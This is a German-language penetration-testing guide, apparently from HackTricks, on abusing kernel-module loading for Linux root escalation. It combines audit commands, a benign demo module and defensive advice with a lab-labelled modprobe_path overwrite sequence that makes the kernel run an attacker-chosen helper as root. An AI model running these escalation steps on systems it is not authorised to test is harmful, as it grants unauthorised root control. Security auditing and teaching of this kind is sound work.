# Missbrauch von Kernel-Modulen und modprobe

{{#include ../../banners/hacktricks-training.md}}

## Fehlkonfigurationen bei Kernel-Modulen und dem Laden von Modulen

Die Unterstützung für Kernel-Module ist ein wichtiger Bereich bei der Analyse von Linux Privilege Escalation. Behandle nicht jede Meldung zu unsignierten Modulen automatisch als ausnutzbar, sondern beantworte damit praktische Fragen:

- Kann der aktuelle Benutzer Module über `sudo`, Capabilities oder einen beschreibbaren Hilfspfad laden?
- Ist das Laden von Modulen noch aktiviert?
- Ist die Erzwingung von Modul-Signaturen deaktiviert?
- Sind Modulverzeichnisse oder Moduldateien beschreibbar?
- Können Kernel-Logs gelesen werden, um zu bestätigen, was passiert ist?

Schnelle Prüfung:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interpretation:

- `modules_disabled=1` bedeutet, dass neue Module bis zum Neustart nicht geladen werden können.
- `module_sig_enforce=1` blockiert normalerweise unsignierte Module.
- `dmesg_restrict=0` ermöglicht es unprivilegierten Benutzern auf vielen Systemen, Kernel-Logs zu lesen.
- Schreibbare Pfade unter `/lib/modules/$(uname -r)/` sind gefährlich, weil die Modulerkennung und das automatische Laden diesem Verzeichnis vertrauen können.

### Laden eines Moduls und Lesen der Kernel-Ausgabe

Wenn du die legitime Berechtigung hast, ein lokales Modul zu laden, fügt `insmod` genau die von dir angegebene `.ko`-Datei ein. Die Init-Funktion des Moduls wird sofort ausgeführt, und mit `printk()` geschriebene Nachrichten erscheinen in den Kernel-Logs.

Minimaler Ablauf für Prüf- oder Laborumgebungen:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Wenn `sudo -l` `insmod`, `modprobe` oder einen Wrapper darum erlaubt, ist dies als kritisch einzustufen:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-erlaubtes `insmod`

Eine sudo-Regel, die es einem Benutzer erlaubt, `insmod` auszuführen, ist nicht damit vergleichbar, ihm die Ausführung eines gewöhnlichen administrativen Helfers zu erlauben. Der Initialisierungscode des Moduls wird im Kernel-Kontext ausgeführt, sobald die `.ko` eingefügt wurde. Die praktische Prüfungsfrage lautet daher: „Kann dieser Benutzer das zu ladende Modul auswählen oder verändern?“

Allgemeiner Prüfungsablauf:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Wenn der Benutzer ein beliebiges `.ko` bereitstellen kann, sollte die Regel bei einer autorisierten Bewertung als vollständige Kompromittierung des Systems eingestuft werden. Ein sichereres Vorgehensmuster besteht darin, das Laden von Modulen nicht über sudo zu delegieren. Falls dies unvermeidbar ist, sollten der genaue Pfad, Eigentümer, Berechtigungen, die Signaturrichtlinie und der Ablauf zur Entfernung eingeschränkt werden.

Für ein harmloses Muster zum Erstellen eines Moduls in einer kontrollierten Laborumgebung sehen eine minimale Quelldatei und ein Makefile folgendermaßen aus:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Nur in einem autorisierten Labor erstellen und laden:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` abuse checks

`kernel.modprobe` steuert den Userspace-Hilfsdienst, den der Kernel aufruft, wenn er Unterstützung beim Laden von Modulen benötigt. Wenn ein Angreifer den Wert auf den Pfad einer beschreibbaren ausführbaren Datei ändern und ein unbekanntes Binärformat oder einen anderen Pfad für Modulanforderungen auslösen kann, kann dies zur Codeausführung als root führen.

Prüfe den aktuellen Hilfsdienst:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Überprüfe, ob du es beeinflussen kannst:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Allgemeines Muster ausschließlich für Laborzwecke:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Auf gehärteten Systemen sollte dies fehlschlagen, da unprivilegierte Benutzer nicht in `kernel.modprobe` schreiben können, der Pfad zum Helper nicht beschreibbar ist oder das Laden von Modulen blockiert wird.

### Überprüfung von beschreibbaren `/lib/modules`-Verzeichnissen

Beschreibbare Modulverzeichnisse können je nach späterem Aufruf von `modprobe` den Austausch von Modulen, das Platzieren schädlicher Module oder den Missbrauch des Auto-loadings ermöglichen.

Überprüfe beschreibbare Speicherorte:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Wenn du schreibbare Modulinhalte findest, überprüfe, wie Module gefunden werden:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Defensive Hinweise:

- Stelle sicher, dass `/lib/modules` `root:root` gehört und für Benutzer nicht beschreibbar ist.
- Setze `kernel.modules_disabled=1` nach dem Booten, sofern dies betrieblich möglich ist.
- Erzwinge die Signierung von Modulen auf Systemen, die ladbare Module benötigen.
- Überwache Schreibvorgänge nach `/proc/sys/kernel/modprobe`, `/lib/modules` sowie unerwartete Ausführungen von `insmod`/`modprobe`.
